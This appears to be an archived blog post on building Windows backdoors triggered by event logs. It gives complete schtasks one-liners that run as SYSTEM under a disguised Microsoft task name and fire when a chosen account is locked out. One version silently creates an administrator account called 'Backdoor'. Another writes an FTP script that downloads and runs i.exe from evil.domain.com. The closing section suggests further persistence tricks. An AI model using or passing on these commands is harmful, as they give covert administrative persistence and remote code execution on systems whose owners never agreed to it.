<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Account Locked Out Task</title>
</head><body><a href="http://blakhal0.blogspot.com/2015/03/windows-event-log-driven-back-doors.html">Source</a><br/>
So how do we nail it down to if a SPECIFIC account gets locked out??<br/>
<br/>
Our built-in friend wevtutil.exe is the man for the job here. Windows Event Utility can read through the event logs and output specific EventID selections. For this instance what we need to do is the following:<br/>
<br/>
wevtutil qe security /rd:true /f:text /c:1 /q:"*[System/EventID=4740]"<br/>
<br/>
qe security - query the security event log<br/>
/rd:true - reverse direction, read from newest to oldest<br/>
/F:text - output it in text format<br/>
/c:1 - Find only the last 1 events (most recent since we have rd set to true)<br/>
<br/>
That will output the last instance of an account getting locked out. It will look something similar to this, in this instance it's from a domain controller, it will look very similar just different names on a non domain controller:<br/>
<br/>
Event[0]:<br/>
&nbsp; Log Name: Security<br/>
&nbsp; Source: Microsoft-Windows-Security-Auditing<br/>
&nbsp; Date: 2015-03-11T10:12:52.499<br/>
&nbsp; Event ID: 4740<br/>
&nbsp; Task: User Account Management<br/>
&nbsp; Level: Information<br/>
&nbsp; Opcode: Info<br/>
&nbsp; Keyword: Audit Success<br/>
&nbsp; User: N/A<br/>
&nbsp; User Name: N/A<br/>
&nbsp; Computer: Domain.Controller.fake.internal<br/>
&nbsp; Description:<br/>
A user account was locked out.<br/>
<br/>
Subject:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Security ID: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;S-1-5-18<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Account Name: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Domain.Controller$<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Account Domain: &nbsp; &nbsp; &nbsp; &nbsp; fake<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Logon ID: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x3e7<br/>
<br/>
Account That Was Locked Out:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Security ID: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;S-1-5-21-561012550-38641HK9414-249823312-7894<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Account Name: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Backupexec<br/>
<br/>
Additional Information:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Caller Computer Name: &nbsp; Someserverorworkstation<br/>
<br/>
Okay, that's a lot of info but we really only need the Account Name. So we pipe it to find:<br/>
<br/>
wevtutil qe security /rd:true /f:text /c:1 /q:"*[System/EventID=4740]" | find /i "account name"<br/>
<br/>
oh wait there's 2 account names in that file, happily since the one we're looking for is the last one we don't have to get into any tricky stuff as that one will decide the errorlevel.<br/>
<br/>
Then we end up with just:<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Account Name: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Backupexec<br/>
<br/>
Then we can do another pass to find the specific account we're looking for<br/>
<br/>
&nbsp;wevtutil qe security /rd:true /f:text /c:1 /q:"*[System/EventID=4740]" | find /i "account name" | find /i "triggeraccount"<br/>
<br/>
Now would be a good moment to mention the 261 character limit, spaces included, for the /TR option of a scheduled task. Always with the restrictions..... no rest for the wicked.<br/>
<br/>
<br/>
So we have to get that cut down a bit if we want to keep everything in just the task run option and not write extra stuff to disk. Lets cut out the net user comment part and nix the nul's.<br/>
<br/>
So we end up with this here:<br/>
<br/>
schtasks /create /tn "Microsoft\Windows\LocalEventLogRotate" /tr "\"cmd.exe\" /k wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4740]\" | find /i \"Account Name:\" | find /i \"triggername\" &amp;&amp; net user Backdoor 1R3AlG00dP@55w0rd /add /y /active:yes &amp; net localgroup administrators Backdoor /add &amp; exit" /f /ru system /ec Security /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4740]]"<br/>
<br/>
We use our &amp;&amp; command (&amp;&amp; = only execute if the previous command was successful) to continue execution if the triggeraccount name is found. We're sitting at a cool 256 characters for the /TR. We're doing good, targeted triggering, creating a user, adding to an administration group. <br/>
<br/>
Having an account is cool, but if we don't have access to the server we're stuck looking through the window from the outside, no fun at all. We can do better.<br/>
<br/>
Alright, same parameters as before, but we're going to bend the rule slightly about writing files to disk. We'll do a one liner FTP command to retrieve and execute a file. I used some formatting tricks to shoehorn everything in here. <br/>
<br/>
schtasks /create /tn "Microsoft\Windows\LocalEventLogRotate" /tr "\"cmd.exe\" /k set &amp;wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4740]\" | find /i \"bob\" &amp;&amp;echo user username&gt; f&amp;echo password&gt;&gt;f&amp;echo bin&gt;&gt;f&amp;echo get i.exe&gt;&gt;f&amp;echo quit&gt;&gt;f&amp;ftp -n -s:f evil.domain.com&amp;start \"\" i.exe&amp;exit" /f /ru system /ec Security /sc onevent /mo "*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4740]]"<br/>
<br/>
We start out the same as before, querying the event log for the most recent locked account and see if it's our good friend bob. Then we set out to writing out our FTP script. Using a couple space cheats and short file names we manage to squeeze everything in. Note that you don't need spaces before or after an &amp; or before or after the append &gt;&gt;. that saves us a bunch of characters which ends up being kind of a big deal since we're limited to 261 characters. Using a single letter for the FTP script file name (f) saves us more space.<br/>
<br/>
Pretty slick right? What else can we do...<br/>
<br/>
Run a task whenever a particular user logs out, change an accounts password back every time the password gets changed, setup a backdoor account if you get locked out / deleted, whatever windows creates an event for, you can create a task for. Your only limits are how specific you want execution to be and 261 characters. Other than that, the world is yours. <br/>
</body></html>